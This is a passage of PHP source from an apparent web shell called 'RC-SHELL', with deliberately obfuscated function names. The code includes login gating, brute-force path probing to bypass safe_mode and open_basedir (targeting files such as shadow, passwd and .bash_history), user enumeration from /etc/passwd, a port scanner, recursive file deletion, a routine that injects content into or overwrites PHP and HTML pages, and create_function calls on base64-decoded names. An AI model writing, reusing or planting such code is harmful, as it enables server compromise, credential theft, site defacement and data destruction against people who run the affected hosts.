.ql2 { ' . z2o(z9w("qlbg1"), z9w("qlbg2"), 1) . ' color: ' . z9w("qlcolor") . '; border-top: 1px solid ' . z9w("qlborder") . '; border-left: 0; border-right: 0; border-bottom: 1px solid #EFEAEF; width:100%; height: 22px; text-shadow: ' . z9w("qlshadow") . ' 2px -1px 10px; }
.qlback { ' . z2o(z9w("qlbg1"), z9w("qlbg2"), 1) . ' border-top: 1px solid ' . z9w("qlborder") . '; border-bottom: 1px solid #EFEAEF; color: ' . z9w("qlcolor") . '; width:100%; text-shadow: ' . z9w("qlshadow") . ' 2px -1px 10px; height: 22px; cursor: pointer; }
.ql1:hover { cursor:pointer; }
.ql2:hover, .qlback:hover { color: ' . z9w("qlcolorhover") . '; cursor: pointer; }
.size1, .size2, .size3, .size4, .size5, .size6, .size7, .size8, .size9, .size10 {  background-color: #FFFFFF; border: 1px solid #CCCCCC; color: #333333; margin: 1px; margin-right: 0; font-size: 10px; text-shadow: 1px 1px 5px #dddddd; vertical-align: middle; }
.size1, .size2, .size3, .size5, .size6, .size7, .size8, .size9, .size10  { height: 20px;}
.size1 { width: 300px; }
.size2 { width: 65px; }
.size3 { width: 200px; }
.size4 { width: 65px; height: 18px; }
.size5 { width: 100px; }
.size6 { width: 150px; }
.size7 { width: 40px; }
.size8 { width: 99%; min-width: 370px; }
.size9 { width: 205px; }
.size10 { width: 550px; }
.list1 { background: #F2f2f2; }
.list2 { background: #F5F5F5; }
.list3 { background: #E0E0E0; }
.list1:hover, .list2:hover { background-color: #E0E0E0; }
.list3:hover { background: #CCCCCC; }
.tdlsh1, .tdlsh2, .tdph { background-color: transparent; border-top: 1px solid #DDDDDD; border-right: 1px solid #FFFFFF; border-bottom: 1px solid #CCCCCC; border-left: 1px solid #CCCCCC; color: #333333; text-shadow: 1px 1px 3px #ffffff; height: 20px; }
.tdlsh1, .tdlsh2 { padding-left: 2px; padding-right: 5px; min-width: 60px; height: 20px; }
.tdlsh1 { border-left: 0; min-width: 350px; }
.tdph { padding-left: 2px; }
.tdpl { background-color: transparent; border-left: 1px solid #dddddd; border-right: 1px solid #ffffff; padding: 2px; min-width: 40px; min-height: 20px; word-break: break-all; }
.head { background-color: transparent; border:0; min-width: 100%; color: #333333; text-shadow: 1px 1px 3px #ffffff; margin: 0; padding:0; font-size: 10px; font-weight: normal; text-align: left; }
.head:hover { cursor: pointer; }
.tdlsh1, .tdlsh2, .tdph { ' . z2o("#F5F5F5", "#E0E0E0") . ' height: 22px !important; }
.tdlsh1:hover, .tdlsh2:hover, .tdph:hover { ' . z2o("#fefefe", "#dddddd") . ' }
.tdlsf { padding-left: 2px; min-width: 300px; height: 20px; vertical-align: middle; }
.tdlsfn, .tdlsf1 { padding-left: 2px; padding-right: 5px; min-width: 60px; height: 20px; vertical-align: middle; }
.tdlsf1 { border-left: 1px solid #FFFFFF; min-width: 200px; }
.tdhead { ' . z2o("#E0E0E0", "#efefef", 1) . ' border-top: 1px solid #f3f3f3; border-bottom: 1px solid #e0e0e0; border-right:0; color: #030303; padding-left: 3px; height: 20px; font-size: 9px; font-weight: bold; }
.tdhead td, .tdlbl { color: #333333; padding: 3px; font-weight: bold; text-shadow: 1px 1px 3px #ffffff; }
.tdlbl { width: 150px; }
.tdmail { padding: 0 10px 0 10px;}
img { vertical-align: middle; }
.fimg { border: 0; padding:0; padding-right:1px; vertical-align: middle; }
.tfilter { width: 100%; }
.tdfilter { ' . z2o("#efefef", "#E0E0E0") . ' border-top: 1px solid #fefefe; color: #333333; padding: 2px; font-weight: bold; }
.nr, .nw, .rw { background-color: transparent; font-weight:normal; text-tecoration: none; }
.nr { color: ' . z9w('errcolor') . '; }
.nw { color: ' . z9w('normalcolor') . '; }
.rw { color: ' . z9w('okcolor') . '; }
.dirlist, .filelist { background-color: transparent; border: 0;  padding: 0; min-width: 80%; font-size: 11px; text-decoration: none; text-align: left; vertical-align: middle !important; }
.dirlist { color: ' . z9w('dircolor') . '; }
.filelist { color: ' . z9w('normalcolor') . '; }
.dirlist:hover, .filelist:hover { cursor: pointer; }
pre { background-color: #FAFAFA; color:#333333; border: 1px solid #CCCCCC; margin-top:0; padding: 5px; max-width: 1000px; max-height: 350px; text-align: left; overflow-x: auto; white-space: pre-wrap; white-space: -moz-pre-wrap !important;  white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; }
pre code { display: block; }
.ftactive, .ftcompat, .ftother { ' . z2o("#f3f3f3", "#cccccc") . ' border: 1px solid #BBBBBB; margin:2px 1px 2px 0; padding: 2px 8px 2px 8px; height:20px; font-size: 10px !important; }
.ftactive:hover, .ftcompat:hover, .ftother:hover { ' . z2o("#CCCCCC", "#F3F3F3") . ' cursor: pointer; }
.ftactive { ' . z2o("#CCCCCC", "#F3F3F3") . ' color: #000000; }
.ftcompat { color: ' . z9w('okcolor') . '; }
.ftother { color: ' . z9w('normalcolor') . '; }
.mbut1, .mbut2 { border: 1px solid #BBBBBB; margin: 2px 1px 2px 0; padding: 1px 5px 1px 5px; height: 20px; font-size: 10px; }
.mbut1 { ' . z2o("#F3F3F3", "#CCCCCC") . ' }
.mbut2 { ' . z2o("#CCCCCC", "#F3F3F3") . ' }
.mbut1:hover, .mbut2:hover { ' . z2o("#cccccc", "#f3f3f3") . ' cursor: pointer; }
.iframe { background-color: #FFFFFF; border: 1px solid #CCCCCC; width: 99%;  height: 300px; vertical-align: middle; }
.console { background-color: transparent; color: #333333; border: 0; width: 100%; height: 300px; }
.tgeneric, .tedit, .txmail { border: 1px solid #cccccc; margin-top: 0; margin-bottom: 1px; width: 99%; }
.tgeneric { height: 150px; }
.tedit { height: 300px; text-align: left; }
.txmail { margin-top: 1px; width: 100%; height: 100px; }
.tsql1, .tsql2 { border: 1px solid #CCCCCC; margin-left: 1px; width: 205px; height: 60px; }
.tsql2 { width: 99% !important; }
.tinj { border: 1px solid #CCCCCC; margin: 1px; width: 300px; height: 46px; }
.tahex { width: 99%; margin-bottom:1px;}
.thex1, .thex2, .thex3 { border: 1px solid #CCCCCC; padding-top:1px; padding-left:3px; font: 13px "monospace", monospace; line-height: 20px; text-align: left; }
.thex1 { color: #000000; }
.thex2 { background-color: #FFFFFF; border-left: 0; border-right: 0; }
.thex3 { color: #000000;}
.idimg, .ifimg { ' . z0i('3') . ' margin-right:2px; width: 16px; height: 16px; vertical-align: middle; }
.idimg { ' . z2o(z9w('idirbg1'), z9w('idirbg2'), 1) . ' border: 1px solid ' . z9w('idirborder') . ';  }
.ifimg { ' . z2o(z9w('ifilebg1'), z9w('ifilebg2')) . ' border: 1px solid ' . z9w('ifileborder') . '; }
.idimg:hover, .ifimg:hover { cursor: pointer; }
.selector, .divls { max-height:350px; height:350px !important; overflow: auto; }
.selector { border-top: 1px solid #FFFFFF; }
.scroll { background-color: transparent; border:0; margin:0; padding:0; max-width: 1024px; max-height:350px; overflow-y: auto; overflow-x: auto; text-align:left; }
.dwidth { width: 99%; }
.barbg { ' . z2o("#dddddd", "#ffffff") . ' border:1px solid #cccccc; margin-right: 5px; padding:0; width:100px; height:7px; vertical-align:middle; float:left; }
.barfil { ' . z2o("#85FF00", "#469F0B") . '; height:7px; padding:0; }
') . '
</style>
</head>
<body' . (($act == "cmd") ? ' onload="document.command.cmd.focus();"' : '') . '>' . (@in_array($act, array('ls', 'search', 'ftp')) ? z3n() : '') . ($act == "f" && @isset($ft) && $ft == "edit" ? z1c() : '') . '
' . z7h(($login ? '1' : '0')) . z6g() . z7k();
}

function z0g($c, $s, $t) {
    return '<input type="submit" title="' . $t . '" value="&nbsp;" style="border:1px solid ' . z9w("topborder1") . '; background: ' . $c . ';  width: ' . $s . 'px; height: ' . $s . 'px; vertical-align: middle; vertical-align: inherit !important; cursor: pointer;">';
}

function z1s($type) {
    return '<input type="submit" class="' . ($type == 'd' ? 'idimg' : 'ifimg') . '" value="&nbsp;">';
}

function z0i($i) {
    return ' -moz-border-radius: ' . $i . 'px; -webkit-border-radius: ' . $i . 'px; border-radius: ' . $i . 'px;';
}

function z2o($s, $e, $d = '') {
    global $nogradient;
    if (@isset($nogradient) && $nogradient) {
        return 'background: ' . (($d == '') ? $s : $e) . ';';
    }
    return 'background: ' . (($d == '') ? $s : $e) . ';
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=\'' . $s . '\', endColorstr=\'' . $e . '\');
background: -webkit-gradient(linear, left top, left bottom, from(' . $s . '), to(' . $e . '));
background: -moz-linear-gradient(top, ' . $s . ', ' . $e . ');
background: -o-linear-gradient(top, ' . $s . ', ' . $e . ');
';
}

function z3x($login = 0) {
    $tc = '';
    foreach (z7x(5, 'skins') as $s) {
        $tc .= z5c(array('act', 'd', 'color_skin' => $s), z4p(z0g(z9w("topbg1"), "11", @strtoupper($s))) . " ");
    }

    echo (!$login ? z7s(z7i(z9j('RC-SHELL v' . z7x('0') . ' : ' . "PAGE GENERATED IN " . (@round(z10r() - start, 4)) . " SECONDS", '4') . z7e($tc, '4')), '2') : '') . z7g() . z7u() . z10w() . '</body></html>';
    exit();
}

function z1z($n, $v = '', $e = 0, $p = '', $d = '', $s = false, $h = false) {
    $_COOKIE[$n] = $v;
    return @setcookie($n, $v, $e, $p, $d, $s, $h);
}

function z1o($n) {
    if (@isset($_COOKIE[$n])) {
        unset($_COOKIE[$n]);
    }
    return @setcookie($n, NULL, -1);
}

function z1u($n) {
    return (@isset($_COOKIE[$n]) ? $_COOKIE[$n] : '');
}

function z1w() {
    foreach (array('bcopy', 'bcut') as $t) {
        global ${$t};
        if (@count(${$t}) > 0) {
            $_SESSION[$t] = ${$t};
            $c = @serialize(${$t});
            z1z($t, $c);
        } else {
            z0u($t);
            z1o($t);
        }
    }
}

function z1g() {
    foreach (array('bcopy', 'bcut') as $t) {
        global ${$t};
        if (@isset($_SESSION[$t])) {
            ${$t} = $_SESSION[$t];
        } elseif (($c = z1u($t)) != '') {
            ${$t} = @unserialize($c);
        } else {
            ${$t} = array();
        }
    }
}

function z0a($a = 1) {
    foreach (array('bcopy', 'bcut') as $t) {
        global ${$t};
        if (@isset(${$t}) && $a) {
            unset(${$t});
        }

        z0u($t);
        z1o($t);
    }
}

function z1l($f, $t) {
    global $bcopy, $bcut;
    z0a(0);
    $u = (($t == 'bcopy') ? 'bcut' : 'bcopy');
    foreach (${$u} as $k => $v) {
        if (${$u}[$k] == $f) {
            unset(${$u}[$k]);
        }
    }
    if (!@in_array($f, ${$t})) {
        ${$t}[] = $f;
    } else {
        foreach (${$t} as $k => $v) {
            if (${$t}[$k] == $f) {
                unset(${$t}[$k]);
            }
        }
    }
}

function z4g() {
    global $color_skin;
    $l = z7x('1');
    $zu = z1u('zu');
    $zp = z1u('zp');
    if ($l['use_auth'] && z7r('md5')) {
        $s = $e = 0;
        if (@isset($_SESSION['ok']) || ($zu == $l['md5_user'] && $zp == $l['md5_pass'])) {
            $s = 1;
        } elseif (@isset($_POST['zu']) && @isset($_POST['zp'])) {
            if (@md5(md5($_POST['zu']).$l['salt']) == $l['md5_user'] && @md5(md5($_POST['zp']).$l['salt']) == $l['md5_pass']) {
                $_SESSION['ok'] = 1;
                z1z('zu', @md5($_POST['zu']));
                z1z('zp', @md5($_POST['zp']));
                $s = 1;
            } else {
                $e = 1;
            }
        }
        if (!$s) {
            $color_skin = z7x('5', 'default_skin');
            z3l(1);
            echo z9l() . z7s(z7i(z9j(z8e(z9s("1"))) . z9j(z6i('zu', ''))) . z7i(z9j(z8e(z9s("2"))) . z9j(z6a('zp', ''))) . z7i(z9j('') . z9j(z8v(z9s("3"), "7")))) . z9z();
            z3x(1);
            exit();
        }
    }
}

function z0u($n) {
    if (@isset($_SESSION[$n])) {
        unset($_SESSION[$n]);
    }
}

function z0k($n) {
    return (@isset($_SESSION[$n]) ? $_SESSION[$n] : false);
}

function z4y() {
    z1o('zu');
    z1o('zp');
    z0u('ok');
    if (@count($_SESSION) > 0) {
        foreach ($_SESSION as $k => $v) {
            z0u($k);
        }
    }
    @session_destroy();
}

function z7n($f) {
    if (!z0n($f)) {
        return '0';
    } elseif (!z0v($f)) {
        return '1';
    } else {
        return '2';
    }
}

function z5h($f) {
    $c = array("red", "white", "green");
    return $c[(z7n($f))];
}

function z6h($f) {
    $c = array("nr", "nw", "rw");
    return $c[(z7n($f))];
}

function z7c($s) {
    if (!@is_numeric($s)) {
        return '0 B';
    }

    $m = 1024;
    $u = @explode(' ', 'B KB MB GB TB PB');
    for ($i = 0; $s > $m; $i++) {
        $s /= $m;
    }
    return @round($s, 2) . ' ' . $u[$i];
}

function z7v($i, $c = 1) {
    foreach (z7q() as $r) {
        if (@strstr(z9n($r), $i)) {
            return z7m(@explode($i, z9n($r)), $c);
        }
    }
    ;
}

function z0e($errno, $errstr, $errfile, $errline) {
    global $safeDirArr, $c, $i;
    preg_match("#SAFE\s+MODE\s+Restriction\s+in\s+effect(.*)not\s+allowed\s+to\s+access\s+(.*)\s+owned\s+by\s+uid(.*)#", $errstr, $o) || preg_match("#open_basedir\s+restriction(.*)File\s*\((.*)\)\s+is\s+not#", $errstr, $o);
    if ($o) {
        $safeDirArr[$c] = $o[2];
        $c++;
    }
}

function z2c($dir) {
    global $win, $safeDirArr;
    if (z7r('glob')) {
        $error_reporting = @ini_get('error_reporting');
        @error_reporting(E_WARNING);
        @ini_set("display_errors", 1);
        $root = "/";
        if ($dir) {
            $root = $dir;
        }

        $c = 0;
        $safeDirArr = array();
        @set_error_handler("z0e");
        $chars = "_-.0123456789abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        for ($i = 0; $i < @strlen($chars); $i++) {
            $path = "{$root}" . ((@substr($root, -1) != "/") ? "/" : NULL) . "{$chars[$i]}";
            $prevD = $safeDirArr[@count($safeDirArr) - 1];
            @glob($path . "*");
            if ($safeDirArr[@count($safeDirArr) - 1] != $prevD) {
                for ($j = 0; $j < @strlen($chars); $j++) {
                    $path = "{$root}" . ((@substr($root, -1) != "/") ? "/" : NULL) . "{$chars[$i]}{$chars[$j]}";
                    $prevD2 = $safeDirArr[@count($safeDirArr) - 1];
                    @glob($path . "*");
                    if ($safeDirArr[@count($safeDirArr) - 1] != $prevD2) {
                        for ($p = 0; $p < @strlen($chars); $p++) {
                            $path = "{$root}" . ((@substr($root, -1) != "/") ? "/" : NULL) . "{$chars[$i]}{$chars[$j]}{$chars[$p]}";
                            $prevD3 = $safeDirarr[@count($safeDirArr) - 1];
                            @glob($path . "*");
                            if ($safeDirArr[@count($safeDirArr) - 1] != $prevD3) {
                                for ($r = 0; $r < @strlen($chars); $r++) {
                                    $path = "{$root}" . ((@substr($root, -1) != "/") ? "/" : NULL) . "{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
                                    @glob($path . "*");
                                }
                            }
                        }
                    }
                }
            }
        }
        $safeDirArr = @array_unique($safeDirArr);
        foreach ($safeDirArr as $item) {
            echo @htmlspecialchars("{$item}") . "\r\n";
        }
        @error_reporting($error_reporting);
    }
}

function z3s($dir) {
    if (z7r('realpath')) {
        global $win, $safeDirArr;
        $chars_rlph = "_-.0123456789abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        $presets_rlph = array('index.php', '.htaccess', '.htpasswd', 'httpd.conf', 'vhosts.conf', 'cfg.php', 'config.php', 'config.inc.php', 'config.default.php', 'config.inc.php', 'shadow', 'passwd', '.bash_history', '.mysql_history', 'master.passwd', 'user', 'admin', 'password', 'administrator', 'phpMyAdmin', 'security', 'php.ini', 'cdrom', 'root', 'my.cnf', 'pureftpd.conf', 'proftpd.conf', 'ftpd.conf', 'resolv.conf', 'login.conf', 'smb.conf', 'sysctl.conf', 'syslog.conf', 'access.conf', 'accounting.log', 'home', 'htdocs', 'access', 'auth', 'error', 'backup', 'data', 'back', 'sysconfig', 'phpbb', 'phpbb2', 'vbulletin', 'vbullet', 'phpnuke', 'cgi-bin', 'html', 'robots.txt', 'billing');
        if (!$dir) {
            $dir = '/etc/';
        }
        ;
        $end_rlph = '';
        $n_rlph = '3';
        $c = 0;
        $safeDirArr = array();
        $rlpArr = array();
        $error_reporting = @ini_get('error_reporting');
        @error_reporting(E_WARNING);
        @ini_set("display_errors", 1);
        @set_error_handler("z0e");
        if ($realpath = realpath($dir . '/')) {
            echo $realpath . "\r\n";
        }
        if ($end_rlph != '' && $realpath = realpath($dir . '/' . $end_rlph)) {
            echo $realpath . "\r\n";
            $rlpArr[] = $realpath;
        }
        foreach ($presets_rlph as $preset_rlph) {
            if ($realpath = realpath($dir . '/' . $preset_rlph . $end_rlph)) {
                echo $realpath . "\r\n";
                $rlpArr[] = $realpath;
            }
        }
        for ($i = 0; $i < strlen($chars_rlph); $i++) {
            if ($realpath = realpath($dir . "/{$chars_rlph[$i]}" . $end_rlph)) {
                echo $realpath . "\r\n";
                $rlpArr[] = $realpath;
            }
            if ($n_rlph <= 1) {
                continue;
            }
            ;
            for ($j = 0; $j < strlen($chars_rlph); $j++) {
                if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}" . $end_rlph)) {
                    echo $realpath . "\r\n";
                    $rlpArr[] = $realpath;
                }
                if ($n_rlph <= 2) {
                    continue;
                }
                ;
                for ($x = 0; $x < strlen($chars_rlph); $x++) {
                    if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}" . $end_rlph)) {
                        echo $realpath . "\r\n";
                        $rlpArr[] = $realpath;
                    }
                    if ($n_rlph <= 3) {
                        continue;
                    }
                    ;
                    for ($y = 0; $y < strlen($chars_rlph); $y++) {
                        if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}" . $end_rlph)) {
                            echo $realpath . "\r\n";
                            $rlpArr[] = $realpath;
                        }
                        if ($n_rlph <= 4) {
                            continue;
                        }
                        ;
                        for ($z = 0; $z < strlen($chars_rlph); $z++) {
                            if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}" . $end_rlph)) {
                                echo $realpath . "\r\n";
                                $rlpArr[] = $realpath;
                            }
                            if ($n_rlph <= 5) {
                                continue;
                            }
                            ;
                            for ($w = 0; $w < strlen($chars_rlph); $w++) {
                                if ($realpath = realpath($dir . "/{$chars_rlph[$i]}{$chars_rlph[$j]}{$chars_rlph[$x]}{$chars_rlph[$y]}{$chars_rlph[$z]}{$chars_rlph[$w]}" . $end_rlph)) {
                                    echo $realpath . "\r\n";
                                    $rlpArr[] = $realpath;
                                }
                            }
                        }
                    }
                }
            }
        }
        $safeDirArr = @array_unique($safeDirArr);
        foreach ($safeDirArr as $item) {
            if (!@in_array($item, $rlpArr)) {
                echo @htmlspecialchars($item) . "\r\n";
            }
        }
        @error_reporting($error_reporting);
    }
}

function z4f($d, $t, $b = 0) {
    $d = z1i($d);
    $t = z1i($t);
    if (@is_dir($d)) {
        if (!z4q($t)) {
            @mkdir($t);
            @chmod($t, 0755);
        }
        $h = @opendir($d);
        while (($o = @readdir($h)) !== false) {
            if (($o != ".") && ($o != "..")) {
                if (@is_dir(z1a($d) . $o)) {
                    z4f(z1a($d) . $o, z1a($t) . $o, $b);
                } else {
                    @copy(z1a($d) . $o, z1a($t) . $o);
                    if ($b) {
                        @unlink(z1a($d) . $o);
                    }
                }
            }
        }
        @closedir($h);
        if ($b) {
            @rmdir($d);
        }
        return true;
    } elseif (@is_file($d)) {
        if (@is_dir($t)) {
            $t = z1a($t) . z2h($d);
        }
        if ($b) {
            if (@copy($d, $t)) {
                return @unlink($d);
            }
        } else {
            return @copy($d, $t);
        }
    } else {
        return false;
    }
}

function z7b($d, $t) {
    return z4f($d, $t);
}

function z8a($d, $t) {
    return z4f($d, $t, 1);
}

function z8s($d) {
    $d = z1a($d);
    $h = @opendir($d);
    while (($o = @readdir($h)) !== false) {
        if ($o != "." && $o != ".." && !z3j($o)) {
            if (!z4j($d . $o)) {
                @unlink($d . $o);
            } else {
                z8s($d . $o);
            }
        }
    }
    @closedir($h);
    @rmdir($d);
    return !z4j($d);
}

function z8d($o) {
    $o = z1i($o);
    if (@z4j($o)) {
        return z8s($o);
    } elseif (z4e($o)) {
        return @unlink($o);
    } else {
        return false;
    }
}

function z8o() {
    $h = (@empty($_SERVER['HTTPS']) || @strtolower($_SERVER['HTTPS']) == 'off' ? 0 : 1);
    $u = 'http' . (($h ? 's' : '') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']);
    $m = (@empty($_SERVER['PATH_INFO']) ? 'QUERY_STRING' : 'PATH_INFO');
    $s = $m == 'QUERY_STRING' ? '?' : '';
    return $u . $s . (@isset($_SERVER[$m]) ? $_SERVER[$m] : '');
}

function z8i() {
    $u = array();
    $p = z9p("/etc/passwd");
    if ($p) {
        $ll = @explode("\n", $p);
        foreach (@array_unique($ll) as $l) {
            $s = @explode(":", $l);
            if (@isset($s[0]) && @isset($s[2]) && @isset($s[3]) && @isset($s[5]) && @isset($s[6]) && !@isset($u[$s[0]])) {
                $u[$s[0]] = array($s[2], $s[3], $s[5], $s[6]);
            }
        }
    } elseif (z7r('posix_getpwuid')) {
        for ($i = 0; $i < 65535; $i++) {
            $a = @posix_getpwuid($i);
            if ($a && @is_array($a)) {
                if (@isset($a['name']) && !@empty($a['name']) && !@isset($u[$a['name']])) {
                    $u[$a['name']] = array($a['uid'], $a['gid'], $a['dir'], $a['shell']);
                }
            }
        }
    }
    return $u;
}

function z6m($t = 0) {
    $a = array();
    $p = z8i();
    if (@count($p) > 0) {
        foreach ($p as $u => $v) {
            $a[] = (($t) ? array($u, $v[2]) : $u);
        }
    }
    return $a;
}

if (!z7r('str_repeat')) {
    function str_repeat($i, $c) {
        $r = '';
        for ($n = 0; $n < $c; $n++) {
            $r .= $i;
        }
        return $r;
    }
}
function z9r($m, $s = 0) {
    if (($m & 0xC000) === 0xC000) {
        $t = "s";
    } elseif (($m & 0x4000) === 0x4000) {
        $t = "d";
    } elseif (($m & 0xA000) === 0xA000) {
        $t = "l";
    } elseif (($m & 0x8000) === 0x8000) {
        $t = "-";
    } elseif (($m & 0x6000) === 0x6000) {
        $t = "b";
    } elseif (($m & 0x2000) === 0x2000) {
        $t = "c";
    } elseif (($m & 0x1000) === 0x1000) {
        $t = "p";
    } else {
        $t = "?";
    }
    $a["r"] = ($m & 00400) > 0;
    $a["w"] = ($m & 00200) > 0;
    $a["x"] = ($m & 00100) > 0;
    $b["r"] = ($m & 00040) > 0;
    $b["w"] = ($m & 00020) > 0;
    $b["x"] = ($m & 00010) > 0;
    $c["r"] = ($m & 00004) > 0;
    $c["w"] = ($m & 00002) > 0;
    $c["x"] = ($m & 00001) > 0;
    if ($s) {
        return array("t" => $t, "o" => $a, "g" => $b, "w" => $c);
    }

    $o["r"] = ($a["r"]) ? "r" : "-";
    $o["w"] = ($a["w"]) ? "w" : "-";
    $o["x"] = ($a["x"]) ? "x" : "-";
    $g["r"] = ($b["r"]) ? "r" : "-";
    $g["w"] = ($b["w"]) ? "w" : "-";
    $g["x"] = ($b["x"]) ? "x" : "-";
    $w["r"] = ($c["r"]) ? "r" : "-";
    $w["w"] = ($c["w"]) ? "w" : "-";
    $w["x"] = ($c["x"]) ? "x" : "-";
    if ($m & 0x800) {
        $o["x"] = ($o["x"] == "x") ? "s" : "S";
    }
    if ($m & 0x400) {
        $g["x"] = ($g["x"] == "x") ? "s" : "S";
    }
    if ($m & 0x200) {
        $w["x"] = ($w["x"] == "x") ? "t" : "T";
    }
    return $t . @join("", $o) . @join("", $g) . @join("", $w);
}

function z8c($i, $s, $e) {
    $p = '';
    $k = array('80' => 'Webserver', '443' => 'OpenSSL', '3306' => 'MySQL', '5432' => 'PostgreSQL');
    if (z7r('fsockopen') && z7r('stream_set_timeout')) {
        for ($n = $s; $n <= $e; $n++) {
            $c = @fsockopen($i, $n, $en, $es, 1);
            if ($c) {
                @stream_set_timeout($c, 0, 50000);
                $t = @preg_replace("/(\r|\n|[^a-z0-9_&%:;\.,\[\]\(\)\s-])/i", "", @fread($c, 100));
                $t = (@isset($k[$n]) ? $k[$n] . ' ' . $t : $t);
                if (@empty($t)) {
                    $t = "Open";
                }

                $p .= "[$i]   Port $n" . ((@strlen($n) < 5) ? @str_repeat(' ', (5-@strlen($n))) : '') . "   $t\r\n";
                @fclose($c);
            }
        }
    }
    return $p;
}

function z8l($a) {
    $b = @strtolower(@ini_get($a));
    if ($b == 'on' || $b == 'yes' || $b == 'true') {
        return 'assert.active' !== $a;
    } elseif ($b == 'stderr' || $b == 'stdout') {
        return 'display_errors' === $a;
    } else {
        return (bool) (int) $b;
    }
}

function z8f($c, $l) {
    return (@strlen($c) > $l) ? @substr($c, 0, (@ceil($l / 2) - 2)) . "[..]" . @substr($c, -(@ceil($l / 2) - 2)) : $c;
}

function init_buffer() {
    if (!@isset($_SESSION['buffer'])) {
        $_SESSION['buffer'] = array();
    }
}

function unset_buffer() {
    if (@isset($_SESSION['buffer'])) {
        unset($_SESSION['buffer']);
    }
}

function z8p($i, $t = 0) {
    return ($t === 0 ? z7v($i) : ($t === 1 ? @ord($i) : @chr($i)));
}

function z8y($s, $d = ',', $e = '"', $esc = '\\') {
    $n = 0;
    $r = array();
    $ed = '%#%#%E%S%C%A%P%E%D%#%#%';
    $s = @str_replace($esc . $e, $ed, $s);
    $s = @preg_replace('/' . $e . '([^' . $e . ']+)' . $e . '(\s|\t)+' . $d . '/', $e . "\\1" . $e . $d, $s);
    $s = @preg_replace('/' . $e . '([^' . $e . ']+)' . $e . $d . '(\s|\t)+/', $e . "\\1" . $e . $d, $s);
    if (@strstr($s, $e)) {
        $a = @explode($e, $s);
        foreach ($a as $i) {
            if ($n++ % 2) {
                @array_push($r, @str_replace($ed, $e, @array_pop($r) . $i));
            } else {
                $b = @explode($d, $i);
                @array_push($r, @str_replace($ed, $e, @array_pop($r) . @array_shift($b)));
                $r = @array_merge($r, $b);
            }
        }
    }
    return $r;
}

function z5g($s, $eol = "\n", $d = ',', $e = '"', $esc = '\\') {
    $r = array();
    if (@strstr($s, $eol)) {
        $p = @explode($eol, $s);
        foreach ($p as $l) {
            if (!@empty($l)) {
                $r[] = z8y($l, $d, $e, $esc);
            }
        }
    } else {
        $r[] = z8y($s, $d, $e, $esc);
    }
    return $r;
}

function z10q() {
    return z8t(z8p(z8b()), z8b());
}

function z8u($e) {
    $r = z9t("PATH='/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin';which $e");
    return (@empty($r) ? 0 : $r);
}

function z9n($i) {
    return @base64_decode($i);
}

function z4h(&$arr, $k = "") {
    if (@is_array($arr)) {
        foreach ($arr as $k => $v) {
            if (@strtoupper($k) != "GLOBALS") {
                if (@strtoupper($k) == "_FILES" && @isset($arr["$k"]) && @count($arr["$k"]) > 0) {
                    z3y($arr["$k"]);
                }
                z4h($arr["$k"]);
            }
        }
    } else {
        $arr = @stripslashes($arr);
    }
}

function z2m($h, $n, $o = 0) {
    $l = @strlen($h);
    $o = ($o > 0) ? ($l - $o) : @abs($o);
    $p = @strpos(@strrev($h), @strrev($n), $o);
    return ($p === false) ? false : ($l - $p-@strlen($n));
}

function z4i($inj, $w, $f) {
    $c = z9p($f);
    $r = '';
    if (!$c) {
        return false;
    }
    switch ($w) {
    case 'top':
        $r = $inj . $c;
        break;
    case 'end':
        $r = $c . $inj;
        break;
    case 'php1':
        $p = @strpos($c, '<?');
        if ($p === false) {
            return false;
        }

        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'php2':
        $p = z2m($c, '?>');
        if ($p === false) {
            return false;
        }

        $p += 2;
        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'html1':
        $p = @strpos($c, '<html>');
        if ($p === false) {
            return false;
        }

        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'html2':
        $p = @strpos($c, '</html>');
        if ($p === false) {
            return false;
        }

        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'html3':
        $p = @strpos($c, '<html>');
        if ($p === false) {
            return false;
        }

        $p += 6;
        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'html4':
        $p = @strpos($c, '</html>');
        if ($p === false) {
            return false;
        }

        $p += 7;
        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'body1':
        if (!@preg_match('/<body[^>]*>/', $c, $m)) {
            return false;
        }

        $p = @strpos($c, $m[0]);
        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'body2':
        $p = z2m($c, '</body>');
        if ($p === false) {
            return false;
        }

        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'body3':
        if (!@preg_match('/<body[^>]*>/', $c, $m)) {
            return false;
        }

        $p = @strpos($c, $m[0]);
        $p += @strlen($m[0]);
        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'body4':
        $p = z2m($c, '</body>');
        if ($p === false) {
            return false;
        }

        $p += 7;
        $r = @substr($c, 0, $p) . $inj . @substr($c, $p);
        break;
    case 'overwrite':
        $r = $inj;
        break;
    default:
        return false;
        break;
    }
    return z9y($f, $r);
}

function z3y(&$a, $k = '') {
    if (@is_array($a)) {
        foreach ($a as $k => $v) {
            z3y($a["$k"]);
        }
    } else {
        if ($a == 'name' || $a == 'tmp_name') {
            $a = z1i($a);
        }
    }
}

function z8t($i, $o) {
    $r = @create_function('$o', 'return @' . z7v($o, 0) . '($o);');
    return $r($i);
}

function z8r($n, $ac, $a, $b = 0) {
    global $act;
